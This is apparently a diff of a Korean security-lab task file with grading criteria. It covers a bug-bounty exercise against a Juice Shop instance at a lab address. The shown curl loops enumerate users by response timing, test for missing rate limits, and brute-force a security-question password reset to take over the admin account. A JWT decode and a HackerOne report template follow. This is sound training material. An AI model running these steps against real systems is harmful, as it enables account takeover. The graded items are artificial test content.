     HackerOne 의 *JuiceShop public program* 을 둘러보다 인증 흐름에 이상한 점을 봤다.
     Reputation 200 점 정도라 신중해야 함 — 어설픈 N/A duplicate 로 점수 깎이면 안 됨.
 
-    > [본인 메모장] "1=1 같은 *교과서 SQLi* 는 이미 다 잡혀있을 거고, JWT alg=none 도 라이브러리에서 patch.
-    > 내가 노릴 건 *합법 흐름의 미세 균열* — rate limit 부재 + 유효 사용자 enumeration + 보안 질문 약점 chain.
-    > 마지막엔 H1 양식 그대로 보고서 + 90일 disclosure 일정. duplicate 안 걸리려면 시각·재현이 핵심."
+    ※ [본인 메모장] "1=1 같은 *교과서 SQLi* 는 이미 다 잡혀있을 거고, JWT alg=none 도 라이브러리에서 patch.
+    ※ 내가 노릴 건 *합법 흐름의 미세 균열* — rate limit 부재 + 유효 사용자 enumeration + 보안 질문 약점 chain.
+    ※ 마지막엔 H1 양식 그대로 보고서 + 90일 disclosure 일정. duplicate 안 걸리려면 시각·재현이 핵심."
 
     학습 목표 (lecture #2 XSS 3 유형 + #4 쿠키 탈취) + (lab #1 user enum + #5 보안 질문 + #14 rate limit) 통합.
 
-    ## 임무 (4 단계, 약 40분)
+    ■ 임무 (4 단계, 약 40분)
 
-    ### 1) 사용자 enumeration 시각 측정 (lab #1, T1589)
+    ▶ 1) 사용자 enumeration 시각 측정 (lab #1, T1589)
     `for u in admin nonexist user1 admin@juice-sh.op random123@x.com; do
        t1=$(date +%s%N); curl -s -o /dev/null -X POST -H "Content-Type: application/json"
        -d "{\"email\":\"$u\",\"password\":\"wrongpw\"}" http://10.20.30.80:3000/rest/user/login
        t2=$(date +%s%N); echo "$u: $(( (t2-t1)/1000000 )) ms"; done`
     응답 시간 차이 → bcrypt 비교 여부로 *유효 사용자 식별 가능* 추정.
 
-    ### 2) Rate limit 부재 + 보안질문 brute (lab #5·#14)
+    ▶ 2) Rate limit 부재 + 보안질문 brute (lab #5·#14)
     Rate limit:
     `for i in $(seq 1 30); do
        curl -s -o /dev/null -w "$i: %{http_code} " -X POST -H "Content-Type: application/json"
@@ -718,44 +977,44 @@ steps:
        -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"newpw\",\"repeat\":\"newpw\"}"
        http://10.20.30.80:3000/rest/user/reset-password; done`
 
-    ### 3) JWT 발급/회전 분석 (lab #6·#8)
+    ▶ 3) JWT 발급/회전 분석 (lab #6·#8)
     `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
     `echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
     alg / iat / exp 추출. exp - iat 가 *너무 큼* (예: 7일) → 토큰 회전 부재 약점.
 
-    ### 4) HackerOne Disclosure 보고서 양식
+    ▶ 4) HackerOne Disclosure 보고서 양식
     아래 그대로 출력 (실 H1 submit 양식):
 
     ```
-    ## Title
+    ■ Title
     [Auth] Rate limit absence on /rest/user/login + verbose error → user enumeration → password reset bypass chain
 
-    ## Severity (CVSS v3.1)
+    ■ Severity (CVSS v3.1)
     8.1 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
 
-    ## Steps to Reproduce
+    ■ Steps to Reproduce
     1. timing oracle: 30회 login (위 1단계) — 유효/무효 사용자 timing 차이 측정
     2. rate limit (위 2단계) — 30회 모두 401, 429 없음
     3. security question dictionary (위 2단계) — 흔한 답 50개 시도
     4. password reset (성공 시) → admin 계정 탈취
 
-    ## Impact
+    ■ Impact
     - 단일 헌터가 30분 내 admin 계정 탈취 가능 (timing → enum → reset chain)
     - JWT exp 7일 → 탈취 후 일주일 지속 접근
 
-    ## Suggested Fix
+    ■ Suggested Fix
     1. rate limit (Express express-rate-limit, 10req/15min/IP)
     2. login 응답 통일 (timing + content)
     3. password reset 보안질문 → 이메일 OTP 전환
     4. JWT exp 1시간 + refresh token rotation
 
-    ## Disclosure Timeline
+    ■ Disclosure Timeline
     - Day 0: 보고 (HackerOne)
     - Day 30: triage 응답 기대
     - Day 60: fix 검증 (CVE 신청 협의)
     - Day 90: public disclosure
 
-    ## Bounty 추정
+    ■ Bounty 추정
     Tier: High → 조회 가능 시 $500-2000 (program 정책 확인)
     ```
 
@@ -781,32 +1040,32 @@ steps:
 
     4) H1 Disclosure 보고서 (heredoc 그대로 출력):
     ```
-    ## Title
+    ■ Title
     [Auth] Rate limit absence + timing enum + reset bypass chain
 
-    ## Severity
+    ■ Severity
     CVSS 8.1 High (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
 
-    ## Steps to Reproduce
+    ■ Steps to Reproduce
     1. timing oracle (1단계 결과)
     2. rate limit (2단계 결과)
     3. security question dictionary (2단계 결과)
     4. password reset → admin 탈취
 
-    ## Impact
+    ■ Impact
     - 단일 헌터 30분 admin 탈취 가능
     - JWT exp 7일 지속 접근
 
-    ## Suggested Fix
+    ■ Suggested Fix
     1. express-rate-limit 10req/15min/IP
     2. 응답 통일 (timing + content)
     3. 보안질문 → 이메일 OTP
     4. JWT exp 1h + refresh rotation
 
-    ## Disclosure Timeline
+    ■ Disclosure Timeline
     Day 0 보고 → Day 30 triage → Day 60 fix 검증 → Day 90 public disclosure
 
-    ## Bounty 추정
+    ■ Bounty 추정
     Tier High → $500-2000
     ```
 
@@ -819,6 +1078,15 @@ steps:
     3) JWT header / payload base64 decode.
     4) H1 양식 6 섹션 (Title/Severity/Steps/Impact/Fix/Disclosure). 헌터 페르소나.
     포인트: 매트릭스 X. *Disclosure 보고서 양식 + 90일 일정* 이 산출물.
+
+    📎 도구 우선순위 (힌트):
+    1) Phase 1 timing: bash for + date +%s%N + ms 환산. 5 사용자 비교.
+    2) Phase 2 rate + 보안 질문: for $(seq 1 30) login + 4 dictionary answer.
+    3) Phase 3 JWT: cut -d. + base64 -d (header/payload).
+    4) Phase 4 H1: heredoc Title/Severity (CVSS v3.1)/Steps/Impact/Fix/Timeline/Bounty.
+    5) 미설치 시: sudo apt install -y curl python3 jq
+    6) 추가: jwt_tool.py / Burp / autoSubmit 도구. CVSS calculator (FIRST.org).
+    7) HackerOne 정책: 90일 disclosure + duplicate 회피 + Reputation 점수.
   category: integration_scenario
   points: 50
   verify:
@@ -836,10 +1104,15 @@ steps:
       - 3) JWT header/payload base64 decode (alg/exp)
       - 4) H1 양식 6 섹션 (Title/Severity/Steps/Impact/Fix/Disclosure Timeline)
       acceptable_methods:
-      - bash for + date %s%N + curl
-      - python3 base64 + cut
-      - heredoc H1 양식
-      - HackerOne / Bugcrowd / Synack 스타일
+      - "Phase 1 timing (수기 baseline): bash for + date +%s%N + ms 환산."
+      - "Phase 2 rate + 보안 질문: 30회 login + 4 dictionary."
+      - "Phase 3 JWT: cut + base64 -d."
+      - "Phase 4 H1 양식: heredoc 6 섹션 + 90일 timeline."
+      - "HackerOne / Bugcrowd / Synack 스타일."
+      - "CVSS Calculator (FIRST.org)."
+      - "jwt_tool.py."
+      - "Burp Pro Bug Bounty profile."
+      - "Bastion AI bug bounty orchestrator: chain detect + 자동 disclosure draft."
       negative_signs:
       - 매트릭스 형식으로 작성 (Disclosure 양식 X)
       - 90일 timeline 누락
